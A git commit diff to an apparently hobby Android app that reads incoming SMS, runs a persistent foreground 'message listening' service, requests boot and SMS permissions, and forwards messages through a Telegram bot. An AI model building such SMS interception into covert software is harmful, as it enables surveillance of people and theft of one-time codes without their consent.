c54cd149d082c358e4ee0a16b538b43afc2c7bdc
KirillMaster <suhorukih@mail.ru>
2023-04-07 11:21:22 +0600

    sms listening

--- app/src/main/java/com/example/smshandler/MainActivity.java
+++ app/src/main/java/com/example/smshandler/MainActivity.java
@@ -1,10 +1,13 @@
 package com.example.smshandler;
 
 import android.Manifest;
+import android.app.ActivityManager;
 import android.content.Context;
+import android.content.Intent;
 import android.content.pm.PackageManager;
+import android.os.Build;
 import android.os.Bundle;
-import android.view.View;
+import android.util.Log;
 import android.widget.TextView;
 
 import androidx.appcompat.app.AppCompatActivity;
@@ -12,13 +15,6 @@ import androidx.core.app.ActivityCompat;
 
 
 public class MainActivity extends AppCompatActivity {
-
-    private TextView textView;
-    private Context context;
-
-    private SmsService smsService;
-    private TelegramBotService telegramBotService;
-
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -28,32 +24,54 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private void App(){
-        context = getApplicationContext();
-        textView = findViewById(R.id.textView);
+        Context context = getApplicationContext();
         SmsFileService smsFileService = new SmsFileService(context);
         PhoneSmsService phoneSmsService = new PhoneSmsService(getContentResolver());
-        smsService = new SmsService(phoneSmsService, smsFileService);
+        SmsService smsService = new SmsService(phoneSmsService, smsFileService);
         RequestPermissions();
-        telegramBotService = new TelegramBotService(smsService);
+        TelegramBotService telegramBotService = new TelegramBotService(smsService);
         telegramBotService.Init();
+        StartForegroundJob();
+        TextView textView = findViewById(R.id.textView);
+
+        if(foregroundServiceRunning()){
+            textView.setText("Прослушка сообщений работает");
+        }
+        else{
+            textView.setText("Не работает");
+        }
     }
 
-    private void FileListing(Sms[] someSms){
-        textView.setText(Extensions.GetAllSmsText(someSms));
+    private void StartForegroundJob(){
+        try{
+            Intent serviceIntent = new Intent(this, ForegroundService.class);
+
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(serviceIntent);
+            }
+            foregroundServiceRunning();
+        }
+        catch (Exception ex){
+            Log.e("Activity", "Can't run foreground task");
+        }
+    }
+
+    public boolean foregroundServiceRunning(){
+        ActivityManager activityManager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
+        for(ActivityManager.RunningServiceInfo service: activityManager.getRunningServices(Integer.MAX_VALUE)) {
+            if(ForegroundService.class.getName().equals(service.service.getClassName())) {
+                return true;
+            }
+        }
+        return false;
     }
 
     private void RequestPermissions(){
         ActivityCompat.requestPermissions(MainActivity.this, new String[] {Manifest.permission.READ_SMS}, PackageManager.PERMISSION_GRANTED);
         ActivityCompat.requestPermissions(MainActivity.this, new String[] {Manifest.permission.RECEIVE_SMS}, PackageManager.PERMISSION_GRANTED);
         ActivityCompat.requestPermissions(MainActivity.this, new String[] {Manifest.permission.INTERNET}, PackageManager.PERMISSION_GRANTED);
-    }
-
-    public void Read_SMS(View view){
-        Sms[] latestSms = smsService.GetUnseenSms();
-
-        if(latestSms.length > 0){
-            FileListing(latestSms);
-            telegramBotService.SendMessage(Extensions.GetAllSmsText(latestSms));
-        }
+        ActivityCompat.requestPermissions(MainActivity.this, new String[] {Manifest.permission.BROADCAST_SMS}, PackageManager.PERMISSION_GRANTED);
+        ActivityCompat.requestPermissions(MainActivity.this, new String[] {Manifest.permission.FOREGROUND_SERVICE}, PackageManager.PERMISSION_GRANTED);
+        ActivityCompat.requestPermissions(MainActivity.this, new String[] {Manifest.permission.RECEIVE_BOOT_COMPLETED}, PackageManager.PERMISSION_GRANTED);
     }
 }
